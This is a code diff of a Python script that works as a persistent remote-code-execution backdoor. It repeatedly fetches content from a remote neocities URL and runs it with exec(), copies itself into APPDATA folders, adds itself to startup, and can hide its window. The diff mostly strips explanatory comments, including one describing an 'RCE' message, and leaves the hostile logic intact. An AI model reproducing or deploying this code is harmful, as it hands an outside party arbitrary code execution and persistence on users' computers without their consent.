@@ -16,7 +16,7 @@ def main():
     code = fetch_code()
 
     if code:
-        # Ejecutar el contenido de code.html (mensaje de "Tu PC tiene una RCE") en una ventana visible
+        # Ejecutar el contenido de code.html 
         run_in_visible_terminal(code)
     else:
         print("No se pudo obtener el contenido de code.html.")
@@ -27,24 +27,23 @@ def run_in_visible_terminal(code):
         # Ejecuta en una ventana de cmd de Windows
         subprocess.Popen(['start', 'cmd', '/k', f'echo {code} & pause'], shell=True)
     else:
-        # En Linux/Mac, abre una terminal y ejecuta el código
         subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'echo "{code}" && read -p "Press Enter to exit..."'])
 
-# Path to the code.html file
+# Path 
 URL_CODE = "https://rsc-site.neocities.org/code.html"
 
-# Directory where copies will be created
+
 COPY_FOLDERS = [
     os.path.join(os.getenv('APPDATA'), 'Folder1'),
     os.path.join(os.getenv('APPDATA'), 'Folder2'),
     os.path.join(os.getenv('APPDATA'), 'Folder3')
 ]
 
-# Previous content of code.html for change detection
+
 previous_code = ""
 
-# Visibility setting (1 = visible, 0 = hidden)
-visibility = 1 # Set to 1 to make the script visible
+#(1 = visible, 0 = hidden)
+visibility = 1 
 
 def fetch_code():
     """Obtiene el contenido de code.html desde la URL"""
@@ -60,9 +59,8 @@ def fetch_code():
 def execute_code(code):
     """Execute the content of code.html"""
     try:
-        # Ensure the code is safe and sanitized
         sanitized_code = code.replace('&', '').replace('|', '').replace('&&', '').replace('||', '')
-        exec(sanitized_code)  # Execute the code dynamically
+        exec(sanitized_code)  
     except Exception as e:
         pass
 
@@ -81,7 +79,7 @@ def run_check():
                 pass
             time.sleep(1)
         except Exception as e:
-            time.sleep(1)  # Retry after 5 seconds in case of an error
+            time.sleep(1)  
 
 def is_running_in_background():
     """Check if the script is already running"""
@@ -138,19 +136,17 @@ def execute_rce_in_background():
     """Execute the RCE if the script is not running"""
     if not is_running_in_background():
         create_copy_in_folders()
-        run_check()  # Start the check loop
+        run_check()  #check loop
     else:
         pass
 
 def set_visibility():
     """Set the visibility of the script"""
     if visibility == 0:
-        # Run the script with pythonw to hide the window
         run_with_pythonw()
     else:
-        # Run normally with a visible window
         execute_rce_in_background()
 
 if __name__ == "__main__":
-    add_to_startup()  # Add the script to startup
-    set_visibility()  # Handle visibility based on the setting
+    add_to_startup() 
+    set_visibility()  
